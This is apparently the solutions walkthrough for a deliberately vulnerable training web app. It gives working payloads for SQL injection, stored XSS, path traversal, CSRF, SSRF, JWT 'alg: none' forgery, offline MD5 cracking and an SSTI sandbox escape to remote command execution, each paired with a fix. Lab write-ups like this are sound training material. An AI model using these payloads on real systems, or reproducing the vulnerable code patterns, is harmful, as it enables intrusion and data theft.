# Solutions Walkthrough

Don't open this until you've genuinely tried. Each section: how to find it,
how to exploit it, the flag, and what the real-world fix looks like (write
findings like this in your own reports — it's the habit worth building).

---

## 1. SQL injection — login bypass

**Where:** `POST /login`, `app/views.py::login_post`

The query is built with raw string interpolation of `username`:
```python
sql = f"SELECT id, username, role FROM users WHERE username = '{username}' AND password_hash = '{pwhash}'"
```

**Exploit:** username = `' OR '1'='1' -- ` (trailing space matters after `--`
for SQLite), any password.

```bash
curl -c cj.txt -X POST http://127.0.0.1:8000/login \
  --data-urlencode "username=' OR '1'='1' -- " \
  --data-urlencode "password=x"
```
Returns the first matching row — `admin` (id 1) since it's inserted first.

**Fix:** parameterized queries everywhere:
`conn.execute("SELECT ... WHERE username=? AND password_hash=?", (username, pwhash))`.

---

## 2. SQL injection — UNION-based data extraction

**Where:** `GET /search`, `app/views.py::search`

```python
sql = f"SELECT tracking_number, origin, destination, status FROM shipments WHERE tracking_number LIKE '%{q}%' OR ..."
```
`DEBUG=True` means SQLite errors (and the raw query) are reflected back —
great for confirming column count via error-based enumeration before
committing to a UNION.

**Exploit:** the query selects 4 columns, so:
```
/search?q=x' UNION SELECT name, value, 'x', 'x' FROM secrets -- 
```
Also works against `users`: `UNION SELECT username, password_hash, role, 'x' FROM users -- `.

**Flag:** `FLAG{sqli_union_secrets_dumped}` (in the `secrets` table).

**Fix:** parameterize; if dynamic search is needed, use `?` placeholders with
`%` wildcards passed as bound parameters, never string-built SQL.

---

## 3. Broken access control — admin panel

**Where:** every `/admin*` route, guarded by `is_admin(req)`:
```python
def is_admin(req):
    return req.cookies.get("role") == "admin"
```
No signature, no server-side session check at all — the cookie is trusted
outright, and you don't even need to be logged in.

**Exploit:**
```bash
curl -b "role=admin" http://127.0.0.1:8000/admin
```
No prior login required.

**Flag:** `FLAG{broken_access_control_admin_reached}`

**Fix:** authorization must be derived server-side from the authenticated
session (`sid` → session store → user row → role), never from a
client-writable cookie. If you must cache role client-side for UX, sign it
(HMAC) and still re-verify server-side for anything sensitive.

---

## 4. IDOR — invoice access

**Where:** `GET /invoice/<invoice_id>`, `app/views.py::invoice_view`. Fetches
by ID with no `inv['user_id'] == user['id']` check.

**Exploit:** register/login as any customer, then:
```
GET /invoice/1
```
(id 1 belongs to the `admin` account — company-confidential invoice).

**Flag:** `FLAG{idor_admin_invoice_exposed}`

Note the contrast: `/support/<ticket_id>` (customer-facing ticket view)
*does* check ownership. Realistic inconsistency — not every endpoint gets
the same scrutiny during development.

**Fix:** every object-fetch-by-ID handler must check the authenticated
user owns (or is authorized for) that object before returning it.

---

## 5. Stored XSS → admin session impact

**Where:** ticket body is escaped on the customer-facing view but **not**
on the admin detail view, `app/views.py::admin_ticket_detail`:
```python
f'<div class="comment">{t["body"]}</div>'   # no templates.e()
```

**Exploit:** submit a support ticket (logged in as any customer) with body:
```html
<script>fetch("/collect?c="+encodeURIComponent(window.ADMIN_FLAG))</script>
```
Then, **as `admin` in an actual browser** (curl won't execute JS), open
`/admin/tickets/<id>` for that ticket. The admin-only pages set
`window.ADMIN_FLAG` — your payload reads it and calls home to `/collect`.
Check `/collected` afterward (as anyone) to see it landed.

**Flag:** `FLAG{stored_xss_admin_flag_exfiltrated}`

This models a realistic modern XSS impact: the session cookie itself is
`HttpOnly` (can't be read via `document.cookie`), so the payload instead
exfiltrates sensitive in-page data / could just as well perform an action
via `fetch(..., {credentials:"include"})` while riding the admin's live
session (try it — e.g., auto-submit an admin reply).

**Fix:** escape all user-supplied content on output, consistently,
everywhere — including admin/internal tooling, which often gets skipped
because "it's just for us."

---

## 6. Path traversal — ticket attachment download

**Where:** `GET /support/download`, `app/views.py::support_download`:
```python
path = os.path.join(config.TICKET_DIR, filename)   # filename unsanitized
```

**Exploit:**
```
GET /support/download?ticket=1&file=../../flag.txt
```
(any logged-in user; ownership of the ticket ID isn't even checked here).

**Flag:** `FLAG{path_traversal_ticket_download}` (in `flag.txt` at the
project root).

**Fix:** resolve the final path with `os.path.realpath()` and verify it's
still inside the intended directory (`os.path.commonpath`) before opening;
better, store an opaque token → real-filename mapping server-side instead
of trusting a client-supplied filename at all.

---

## 7. Unrestricted file upload → stored XSS via SVG

**Where:** `POST /careers/apply` and `POST /support/new` save uploads with
the client-supplied filename, no extension allowlist, no content
inspection. `GET /uploads/resumes/<filename>` then serves the file back
with a browser-guessed content type and **no** `Content-Disposition:
attachment` — so an `.svg` (or `.html`) upload renders inline.

**Exploit:** upload a resume with this content as `evil.svg`:
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <script>fetch('/collect?c=' + document.domain)</script>
</svg>
```
Then, as `admin`, open `/admin/applications` and click through to the
resume link (or visit `/uploads/resumes/evil.svg` directly) — script runs
in the NovaFreight origin.

**Fix:** allowlist extensions/content-types server-side (verify actual
file content, not just the extension), store uploads outside the webroot
or serve them from a separate, cookie-less origin, and always send
`Content-Disposition: attachment` plus a locked-down `Content-Type` for
user-supplied files.

---

## 8. CSRF — account email change via GET

**Where:** `/account/update` accepts both `GET` (query string) and `POST`
(form body) and performs the same state change either way — no CSRF token,
and the vulnerable path is reachable via a plain top-level navigation
(`GET`), which browsers will happily do cross-site.

**Exploit:** while logged in, visit (as a top-level navigation — an
`<img>` tag won't trigger this due to `SameSite=Lax`, but a link click or
`location.href` redirect will):
```
http://127.0.0.1:8000/account/update?email=attacker@evil.example
```
A real attacker page would do `<script>location = ".../account/update?email=..."</script>`.

**Flag:** `FLAG{csrf_email_changed}` (only awarded for the GET path,
proving the actual vuln rather than just using the normal form).

**Fix:** state-changing actions must be POST-only, must include a
per-session anti-CSRF token validated server-side, and cookies should use
`SameSite=Strict` or `Lax` as a defense-in-depth layer (not a substitute
for tokens).

---

## 9. Information disclosure — leaked backup config

**Where:** `GET /backup/config.py.bak`, not linked anywhere, hinted at by
`Disallow: /backup/` in `/robots.txt` (a common recon tell — things people
disallow from crawlers are often things they don't want found, which is
exactly why they get found).

**Exploit:** just request it. Contains `SECRET_KEY` and
`INTERNAL_API_TOKEN`, which unlock findings #10 and #11 below.

**Fix:** never ship backup/config files into a web-served directory, full
stop. Secrets belong in a vault or environment variables injected at
runtime, never in source-adjacent files — and CI should fail the build if
`.bak`/`.env`/etc. patterns are detected in deployable output.

---

## 10. SSRF — carrier label fetch tool

**Where:** `POST /admin/tools/fetch`, `app/views.py::admin_fetch_post`:
```python
r = urllib.request.Request(url, headers={"X-Internal-Token": config.INTERNAL_API_TOKEN, ...})
```
It fetches **any** URL the admin gives it, and always attaches the
internal service token — meant only for trusted internal calls, applied
blindly to attacker-controlled targets.

The internal target, `GET /internal/warehouse-api`, isn't linked anywhere
and 403s without that header:
```python
if req.headers.get("x-internal-token") != config.INTERNAL_API_TOKEN:
    return forbidden(...)
```

**Exploit:** as admin (see #3 for how to get there without credentials):
```bash
curl -b "role=admin" -X POST http://127.0.0.1:8000/admin/tools/fetch \
  --data-urlencode "url=http://127.0.0.1:8000/internal/warehouse-api"
```
The fetch tool's blind header-attachment does the auth bypass for you —
note you don't even need to know `INTERNAL_API_TOKEN` to pull this off,
which is what makes it a *true* SSRF finding rather than just "an
authenticated request to an endpoint whose secret you happened to leak."
(Finding #9 gives you the token too, for an alternate direct-request path —
compare the two and note SSRF is strictly more powerful here.)

**Flag:** `FLAG{ssrf_internal_warehouse_access}`

**Fix:** never let user input control the destination of a server-side
request without an allowlist. Internal-only endpoints should live on a
network segment the app server itself can't blindly forward attacker
input into — and trusted internal headers should be added by an internal
proxy/mesh layer, not baked into a general-purpose "fetch this URL" utility.

---

## 11. Broken authentication — JWT `alg: none` forgery

**Where:** `app/views.py::jwt_decode`:
```python
if alg == "none":
    return payload   # signature never checked
```
The mobile API (`POST /api/login`, `GET /api/me`, `GET /api/admin/stats`)
trusts whatever role claim is in the payload once this check passes.

**Exploit:** forge a token with header `{"alg":"none","typ":"JWT"}` and
payload `{"sub":1,"username":"admin","role":"admin"}`, base64url-encode
each, join with dots, leave the signature segment empty:
```python
import base64, json
b64u = lambda d: base64.urlsafe_b64encode(d).rstrip(b'=').decode()
h = b64u(json.dumps({"alg":"none","typ":"JWT"}).encode())
p = b64u(json.dumps({"sub":1,"username":"admin","role":"admin"}).encode())
token = f"{h}.{p}."
```
```bash
curl http://127.0.0.1:8000/api/admin/stats -H "Authorization: Bearer $TOKEN"
```

**Flag:** `FLAG{jwt_alg_none_forgery}`

**Alternate path:** the leaked `SECRET_KEY` from #9 also lets you forge a
*validly signed* `HS256` token from scratch (real-world equivalent: a
leaked signing key, arguably worse since it doesn't require the
`alg:none` bug to exist at all).

**Fix:** never let the token itself dictate its own verification
algorithm — the server should pin one algorithm and reject anything else
outright (this is exactly the class of bug real JWT libraries had to
patch defensively for). Use an established, audited library rather than
hand-rolling token verification.

---

## 12. Weak credential storage

**Where:** `app/db.py::md5()` — passwords hashed with unsalted MD5.

**Exploit:** dump `password_hash` values via #2 or #3, then crack offline:
```bash
hashcat -m 0 -a 0 hashes.txt rockyou.txt
# or
john --format=raw-md5 --wordlist=rockyou.txt hashes.txt
```
`admin`'s hash cracks to `admin123` in seconds.

**Fix:** bcrypt/scrypt/argon2 with per-user salt and a deliberately slow
work factor — never a fast general-purpose hash for passwords.

---

## 13. (Bonus) SSTI → sandbox escape → RCE

**Where:** `app/views.py::render_mini_template` — a hand-rolled `{{ }}`
substitution using `eval(expr, {"__builtins__": {}}, context)`. Removing
`__builtins__` blocks bare names like `open`/`__import__`, but attribute
access and indexing still work, which is the whole hole.

**Exploit chain:**

1. Confirm evaluation: `POST /contact/preview` with `message={{ 7*7 }}` →
   preview shows `49`.
2. Enumerate live classes (no builtins needed — pure attribute access):
   `{{ ().__class__.__bases__[0].__subclasses__() }}`
3. Find a class whose `__init__.__globals__` contains a real
   `__builtins__` dict (most stdlib-defined classes do) — pick one and
   pull `__import__` back out of it:
```
{{ [c for c in ().__class__.__bases__[0].__subclasses__()
    if c.__name__ == '_WeakValueDictionary'][0]
    .__init__.__globals__['__builtins__']['__import__']('os')
    .popen('id').read() }}
```
The exact class name that works can vary by Python version/build — if
`_WeakValueDictionary` isn't present, enumerate the list from step 2 and
test candidates (anything from `importlib`/`weakref`/`os.path` internals
usually works).

4. Read the flag, which is only reachable via a real OS-level call, not
   any HTTP route (proving genuine code execution, not just sandbox
   introspection):
```
{{ ... .__import__('os').environ.get('LAB_RCE_FLAG') }}
```

**Flag:** `FLAG{ssti_sandbox_escape_rce}`

**Fix:** don't hand-roll a template engine with `eval()`. If you need
user-influenced templating, use a real sandboxed engine (Jinja2's
`SandboxedEnvironment`, and even then stay current on sandbox-escape CVEs)
— or better, don't evaluate user input as code at all; use plain
string substitution with no expression language.
